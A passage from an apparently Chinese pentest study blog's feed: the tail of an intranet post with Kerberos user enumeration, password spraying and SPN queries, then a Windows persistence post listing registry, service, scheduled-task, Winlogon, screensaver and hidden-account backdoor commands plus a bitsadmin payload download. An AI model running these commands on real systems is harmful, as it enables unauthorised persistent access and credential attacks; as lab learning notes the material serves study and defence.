ghost.com Admin123!</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318191719021.png" alt="image-20220318191719021"></p><h4 id="PY版本-pyKerbrute"><a href="#PY版本-pyKerbrute" class="headerlink" title="PY版本 pyKerbrute"></a>PY版本 pyKerbrute</h4><blockquote><p>  <a href="https://github.com/3gstudent/pyKerbrute">pyKerbrute</a></p></blockquote><p>不演示了，爆破用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 EnumADUser.py 192.168.188.100 ghost.com user.txt tcp</span><br><span class="line">python2 EnumADUser.py 192.168.188.100 ghost.com user.txt udp</span><br></pre></td></tr></table></figure><p>口令爆破：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#明文</span><br><span class="line">python2 ADPwdSpray.py 192.168.188.100 ghost.com user.txt clearpassword Admin123! tcp</span><br><span class="line"></span><br><span class="line">#hash</span><br><span class="line">python2 ADPwdSpray.py 192.168.188.100 ghost.com user.txt ntlmhash aaaaaaaaaaaaaaaaaaaa(hash) udp</span><br></pre></td></tr></table></figure><p>参考：</p><blockquote>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/-V1gEpdsUExwU5Fza2YzrA</span><br><span class="line">https://mp.weixin.qq.com/s/vYeR9FDRUfN2ZczmF68vZQ</span><br><span class="line">https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;mid=2247496592&amp;idx=2&amp;sn=3805d213ba1013e320f48169516c2ca3&amp;chksm=e91523aade62aabc21ebca36a5216f63ec0d4c61e3dd1b4632c10adbb85dfde07e6897897fa5&amp;scene=21#wechat_redirect</span><br><span class="line">https://blog.csdn.net/weixin_41598660/article/details/109152077</span><br><span class="line">https://xz.aliyun.com/t/7724#toc-4</span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</span><br><span class="line">http://hackergu.com/ad-information-search-powerview/</span><br><span class="line">https://www.freebuf.com/news/173366.html</span><br><span class="line">https://www.cnblogs.com/mrhonest/p/13372203.html</span><br><span class="line">https://payloads.online/scripts/Invoke-DomainPasswordSpray.txt</span><br><span class="line">https://github.com/dafthack/DomainPasswordSpray</span><br><span class="line">https://blog.csdn.net/qq_36119192/article/details/105088239</span><br><span class="line">https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe</span><br></pre></td></tr></table></figure></blockquote><h2 id="SPN-扫描"><a href="#SPN-扫描" class="headerlink" title="SPN 扫描"></a>SPN 扫描</h2><blockquote><p>  SPN全程 Service Principal Names，是服务器上所运行服务的唯一标识，每个使用kerberos认证的服务都需要一个SPN。<br>  SPN分为两种，一种注册在AD的机器账户下(Computers)下，另一种注册在域用户账户(Users)下<br>  当一个服务的权限为Local System或Network Service，则SPN注册在机器账户(Computers)下<br>  当一个服务的权限为一个域用户，则SPN注册在域用户账户(Users)下</p></blockquote><p>SPN扫描能让我们更快的发现在域内运行的服务，并且很难被发现</p><h3 id="SPN格式"><a href="#SPN格式" class="headerlink" title="SPN格式"></a>SPN格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>  serviceclass可以理解为服务的名称，常见的有www,ldap,SMTP,DNS,HOST等</li><li>  host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li><li>  如果服务运行在默认端口上，则端口号(port)可以省略</li></ul><h3 id="SPN-查询"><a href="#SPN-查询" class="headerlink" title="SPN 查询"></a>SPN 查询</h3><p>查看当前域内的所有SPN:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q */*</span><br></pre></td></tr></table></figure><p>查询具体域所有SPN：</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319170505083.png" alt="image-20220319170505083"></p><p>以CN开头的每一行代表一个账户，下面的信息是与之关联的SPN<br>对于上面的输出数据，机器账户(Computers)为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CN=WIN-4JS3YOGGQ2T,OU=Domain Controllers,DC=ghost,DC=com</span><br><span class="line">CN=DM_WIN2003,CN=Computers,DC=ghost,DC=com</span><br><span class="line">CN=DM_WINXP,CN=Computers,DC=ghost,DC=com</span><br><span class="line">CN=DM_WIN10,CN=Computers,DC=ghost,DC=com</span><br><span class="line">CN=DM_WIN10_2,CN=Computers,DC=ghost,DC=com</span><br></pre></td></tr></table></figure><p>域用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN=krbtgt,CN=Users,DC=ghost,DC=com</span><br></pre></td></tr></table></figure><h2 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;GitHub：&lt;a href=&quot;https://github.com/Ghostasky/IntranetPenetrationLearn&quot;&gt;https://github.com/Ghostasky/IntranetPenetrationLearn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;给</summary>
      
    
    
    
    
    <category term="内网" scheme="http://example.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Windows权限维持学习</title>
    <link href="http://example.com/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-03-07T16:00:00.000Z</published>
    <updated>2022-03-08T12:13:05.983Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>简单记录下Windows权限维持的内容。</p><h1 id="0x1-辅助功能镜像劫持"><a href="#0x1-辅助功能镜像劫持" class="headerlink" title="0x1 辅助功能镜像劫持"></a>0x1 辅助功能镜像劫持</h1><p>先前的版本可以直接更换：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">屏幕键盘： C:\Windows\System32\osk.exe</span><br><span class="line">放大镜： C:\Windows\System32\Magnify.exe</span><br><span class="line">旁白： C:\Windows\System32\Narrator.exe</span><br><span class="line">显示切换器 C:\Windows\System32\DisplaySwitch.exe</span><br><span class="line">应用切换器： C:\Windows\System32\AtBroker.exe</span><br></pre></td></tr></table></figure><p>直接命令行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy c:\windows\system32\sethc.ex c:\windows\system32\sethc1.exe</span><br><span class="line">copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure><p>高版本需要IFEO。所谓的IFEO就是Image File Execution Options，直译过来就是映像劫持。它又被称为“重定向劫持”（Redirection Hijack），它和“映像劫持”（Image Hijack，或IFEO Hijack）只是称呼不同，实际上都是一样的技术手段。白话来讲就是做某个操作的时候被拦截下来，干了别的事。</p><p>在iexplorer.exe中加键值对：debugger  c:\windows\system32\cmd.exe</p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172433830.png" alt="image-20220308172433830"></p><p>或者直接命令行(需要管理员权限)：</p><p><code>reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe&quot; /v &quot;Debugger&quot; /t REG_SZ /d &quot;c:\windows\system32\cmd.exe&quot; /f</code></p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172741639.png" alt="image-20220308172741639"></p><h1 id="0x2-启动项-服务后门"><a href="#0x2-启动项-服务后门" class="headerlink" title="0x2.启动项/服务后门"></a>0x2.启动项/服务后门</h1><h2 id="开始菜单启动项"><a href="#开始菜单启动项" class="headerlink" title="开始菜单启动项"></a>开始菜单启动项</h2><p>开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\SD\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>相关键值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders </span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure><p>重启后会自动自启</p><h2 id="启动项注册表后门"><a href="#启动项注册表后门" class="headerlink" title="启动项注册表后门"></a>启动项注册表后门</h2><p><code>HKEY_CURRENT_USER</code>的改动不需要管理员权限。（更改<code>HKEY_LOCAL_MACHINE</code>需要管理员权限）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308175519252.png" alt="image-20220308175519252"></p><p>同样，重启后会自启动。</p><p>使用命令行，修改hklm，需要管理员：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   /v &quot;123&quot; /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><h2 id="自启动服务后门"><a href="#自启动服务后门" class="headerlink" title="自启动服务后门"></a>自启动服务后门</h2><blockquote><p>  在 Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE /DLL等可执行文件注册为服务实现后门持久化。</p></blockquote><p>可以通过如下命令行方式添加一个服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc create asdfadfa binpath=   &quot;C:\Users\SD\Desktop\test.exe&quot;  start= &quot;auto&quot; obj=&quot;LocalSystem&quot;</span><br><span class="line">sc start asdfadfa </span><br></pre></td></tr></table></figure><p>删除服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc delete asdfadfa</span><br></pre></td></tr></table></figure><p>或者powershell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-Service -Name &quot;pentestlab&quot; -BinaryPathName &quot;C:\temp\pentestlab.exe&quot; -Description &quot;PentestLaboratories&quot; -StartupType Automatic</span><br><span class="line">sc start pentestlab</span><br></pre></td></tr></table></figure><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308181535484.png" alt="image-20220308181535484"></p><h1 id="0x3-系统计划任务后门"><a href="#0x3-系统计划任务后门" class="headerlink" title="0x3.系统计划任务后门"></a>0x3.系统计划任务后门</h1><blockquote><p>  Windows实现定时任务主要有schtasks与at二种方式:</p><p>  At 适用于windows xp/2003，Schtasks适用于win7/2008或者以后</p></blockquote><p><code>taskschd.msc</code></p><p>5min执行一次</p><p><code>schtasks /create /sc minute /mo 5   /tn &quot;aaaa&quot; /tr C:\Windows\System32\cmd.exe</code></p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308182919522.png" alt="image-20220308182919522"></p><h1 id="0x4-DLL劫持"><a href="#0x4-DLL劫持" class="headerlink" title="0x4.DLL劫持"></a>0x4.DLL劫持</h1><blockquote><p>  DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary 来看。熟悉Windows代 码的同学都知道，调⽤ LoadLibrary 时可以使⽤DLL的相对路径。这时，系统会按照特定的顺序搜索⼀ 些⽬录，以确定DLL的完整路径。根据MSDN⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的 DLL⽂件（会根据SafeDllSearchMode配置⽽稍有不同）。</p><ol><li> 程序所在⽬录。</li><li> 加载 DLL 时所在的当前⽬录。</li><li> 系统⽬录即 SYSTEM32 ⽬录。</li><li> 16位系统⽬录即 SYSTEM ⽬录。</li><li> Windows⽬录。</li><li> PATH环境变量中列出的⽬录</li></ol><p>  dll劫持就发⽣在系统按照顺序搜索这些特定⽬录时。只要⿊客能够将恶意的DLL放在优先于正常DLL所在的⽬录，就能够欺骗系统优先加载恶意DLL，来实现“劫持”。</p></blockquote><p>在win7及win7以上系统增加了KnownDLLs保护，需要在如下注册表下添加dll才能顺利劫持：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls</span><br></pre></td></tr></table></figure><p><a href="https://www.anquanke.com/post/id/225911">DLL劫持原理及其漏洞挖掘（一）</a></p><h1 id="0x5-Winlogon用户登录初始化"><a href="#0x5-Winlogon用户登录初始化" class="headerlink" title="0x5.Winlogon用户登录初始化"></a>0x5.Winlogon用户登录初始化</h1><p>winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\</span><br><span class="line">HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</span><br></pre></td></tr></table></figure><p>命令行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg delete &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /f</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;  /v &quot;Userinit&quot; /t REG_SZ /d &quot;C:\Windows\system32\cmd.exe,&quot; /f</span><br></pre></td></tr></table></figure><p>powershell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty   &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name   Userinit -value &quot;C:\Windows\system32\userinit.exe,C:\Windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184001989.png" alt="image-20220308184001989"></p><h1 id="0x6-Logon-Scripts后门"><a href="#0x6-Logon-Scripts后门" class="headerlink" title="0x6.Logon Scripts后门"></a>0x6.Logon Scripts后门</h1><p>Windows登录脚本，当用户登录时触发，<strong>Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截</strong>。</p><p>注册表位置:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Environment</span><br></pre></td></tr></table></figure><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184533410.png" alt="image-20220308184533410"></p><h1 id="0x7-文件关联"><a href="#0x7-文件关联" class="headerlink" title="0x7.文件关联"></a>0x7.文件关联</h1><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。</p><p>可以用assoc命令显示或修改文件扩展名关联，使用ftype显示或修改文件类型</p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185550636.png" alt="image-20220308185550636"></p><p>需要管理员权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCR\txtfile\shell\open\command&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Windows\system32\cmd.exe %1&quot; /f</span><br></pre></td></tr></table></figure><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185838423.png" alt="image-20220308185838423"></p><h1 id="0x8-Bitsadmin"><a href="#0x8-Bitsadmin" class="headerlink" title="0x8.Bitsadmin"></a>0x8.Bitsadmin</h1><blockquote><p>  <a href="https://toutiao.io/posts/bcz5e1o/preview">BITSAdmin的介绍与Windows渗透测试中的使用</a></p><p>  <a href="https://micro8.gitbook.io/micro8/contents-1/41-50/41bitsadmin-yi-ju-hua-xia-zai-payload">bitsadmin一句话下载payload</a></p></blockquote><blockquote><p>  Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。Microsoft提供了一个名为“ bitsadmin ” 的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。</p></blockquote><p>window7以上自带：<code>c:\windows\system32\bitsadmin.exe</code></p><p>使用功能transfer参数下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\bitsadmin.exe /transfer backdoor &quot;http://sssssssss/CM.EXE&quot; C:\1.exe</span><br></pre></td></tr></table></figure><p>复制本地文件：</p><p>BITSAdmin遵循文件传输的原则。因此，可以将其用作复制和粘贴命令。这意味着BITSAdmin也能将同一台计算机上的一个位置传输到另一个位置。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create whitehat_day <span class="comment">#创建一个whitehat_day的任务。</span></span><br><span class="line"><span class="comment">#使用/addfile参数将传输文件添加到whitehat_day任务中，并声明传输的文件名与路径，和保存位置与名称</span></span><br><span class="line">bitsadmin /addfile whitehat_day d:\file.txt d:\testfile.txt</span><br><span class="line">bitsadmin /resume whitehat_day<span class="comment">#使用/resume参数来开启传输。</span></span><br><span class="line">bitsadmin /complete whitehat_day<span class="comment">#以临时文件的形式传输文件。要获取完整的文件，需要使用/complete参数</span></span><br><span class="line">Get-ChildItem -Path d:\  <span class="comment">#查看目标路径下是否存在file.txt</span></span><br></pre></td></tr></table></figure><h1 id="0x9-屏幕保护程序"><a href="#0x9-屏幕保护程序" class="headerlink" title="0x9.屏幕保护程序"></a>0x9.屏幕保护程序</h1><blockquote><p>  利用前提:对方开启了屏幕保护</p><p>  屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。</p></blockquote><p>注册表位置:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hkcu\control panel\desktop&quot; /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /f</span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaveActive /d 1 /f</span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaverIsSecure /d 0 /f</span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaveTimeOut /d 60 /f</span><br></pre></td></tr></table></figure><p>如果从未设置过屏保程序的话，除“ScreenSaveActive”默认值为1，其他键都是不存在的，而屏保程序的正常运行必须保证这几个键都有数据才可以，因此必须把4个键都重写一遍。另外，经测试屏保程序最短触发时间为60秒，即使改成小于60的数值，依然还是60秒后执行程序。<br>当然，从注册表路径也可以看出这种方式只能获得当前用户权限的shell，优点是不需要提权即可维持。</p><h1 id="0xA-WMI构造无文件后门（待完成）"><a href="#0xA-WMI构造无文件后门（待完成）" class="headerlink" title="0xA WMI构造无文件后门（待完成）"></a>0xA WMI构造无文件后门（待完成）</h1><p>WMI(Windows Management Instrumentation，即Windows管理规范)，大多数基于Windows的软件依赖于此服务。</p><blockquote><p>  <a href="https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html">WMI的攻击，防御与取证分析技术之攻击篇</a></p><p>  <a href="https://xz.aliyun.com/t/2080">wmi与vbs</a></p><p>  <a href="https://m0nst3r.me/pentest/%E5%88%A9%E7%94%A8WMI%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E5%BC%82%E6%AD%A5%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8.html">利用WMI构建一个持久化的异步的无文件后门</a></p><p>  <a href="https://blog.51cto.com/antivirusjo/2092545">WMI利用专题</a></p><p>  <a href="https://www.anquanke.com/post/id/88851">Powershell攻击指南黑客后渗透之道系列——进阶利用</a></p><p>  <a href="https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html">A WMI Based Agentless Post-Exploitation RAT Developed in PowerShell</a></p><p>  <a href="https://www.tuicool.com/articles/zmUVbyJ">WMI Backdoor</a></p><p>  <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor">Appendix L: Events to Monitor</a></p><p>  <a href="http://demon.tw/copy-paste/vbs-wmi-trojan-3.html">利用WMI打造完美“三无”后门</a></p><p>  <a href="https://www.tuicool.com/articles/IzieuyR">如何检测并移除WMI持久化后门？</a></p><p>  <a href="https://www.anquanke.com/post/id/85851">解析APT29的无文件WMI和PowerShell后门</a></p><p>  <a href="https://www.aqniu.com/learn/31053.html">无文件攻击的兴起与应对之道</a></p></blockquote><h1 id="0xB-影子用户"><a href="#0xB-影子用户" class="headerlink" title="0xB.影子用户"></a>0xB.影子用户</h1><p>即创建的隐藏用户，它无法通过普通命令进行查询，比较隐蔽。（要管理员）</p><p>创建个隐藏用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test$ 123456 /add</span><br><span class="line">net localgroup administrators test$ /add</span><br></pre></td></tr></table></figure><p>net user无法查看</p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308193032710.png" alt="image-20220308193032710"></p><p>但是可以在计算机管理和登陆页面中看到</p><p>下面解决这个问题：</p><p>修改<code>HKEY_LOCAL_MACHINE\SAM\SAM</code> admin的权限为完全控制和读取，重新打开后导出3个内容：</p><p>test$导出为1.reg<br>000003EC包含test$用户的F值，导出另存为2.reg<br>000003E9包含WIN10用户的F值，导出另存为3.reg</p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308194155751.png" alt="image-20220308194155751"></p><p>将2.reg中的F值替换为3.reg中的F值，即将test$用户的F值替换为WIN10用户的F值.</p><p>删除test$用户，之后注册表就 无法打开了，导入1,2注册表：</p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308194707146.png" alt="image-20220308194707146"></p><p>这时登陆界面已经没有账户了，3389可以直接登陆，以test$用户登陆，登陆之后的身份是原来WIN10用户，桌面也是原用户的，达到克隆效果。这个时候再用<code>net user test$ /del</code>是删除不掉这个用户的，只能通过注册表来删除。</p><h1 id="0xC-Netsh"><a href="#0xC-Netsh" class="headerlink" title="0xC.Netsh"></a>0xC.Netsh</h1><p>权限要求：未降权的管理员权限。<br>netsh也是Windows自带的命令，是用来配置网络的命令行工具。该工具可以通过导入helperdll的方式实现功能，且DLL导入后会写进注册表，永久有效.</p><p>关于<code>helper dll</code>的编写可以参考这个项目：<a href="https://github.com/outflanknl/NetshHelperBeacon">NetshHelperBeacon</a></p><p>注册表位置：<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code></p><p>netsh并不会开启自启动，因此还要再写一条自启动项：<br><code>reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Pentestlab /t REG_SZ /d &quot;cmd /c C:\Windows\System32\netsh&quot;</code></p><blockquote><p>  <a href="https://xz.aliyun.com/t/9718">Windows权限维持总结</a></p><p>  <a href="https://xz.aliyun.com/t/8095">Windows权限维持整理</a></p><p>  <a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/">权限维持篇</a></p><p>  <a href="https://xz.aliyun.com/t/6461">windows中常见后门持久化方法总结</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;简单记录下Windows权限维持的内容。&lt;/p&gt;
&lt;h1 id=&quot;0x1-辅助功能镜像劫持&quot;&gt;&lt;a href=&quot;#0x1-辅助功能镜像劫持&quot; class=&quot;headerlink&quot; title=&quot;0x1 辅助功能镜像劫持&quot;&gt;&lt;/a&gt;0x1 辅助功能镜</summary>
      
    
    
    
    
    <category term="渗透" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Nodejs原型链污染</title>
    <link href="http://example.com/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://example.com/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2022-02-28T16:00:00.000Z</published>
    <updated>2022-03-01T12:41:53.688Z</updated>
    
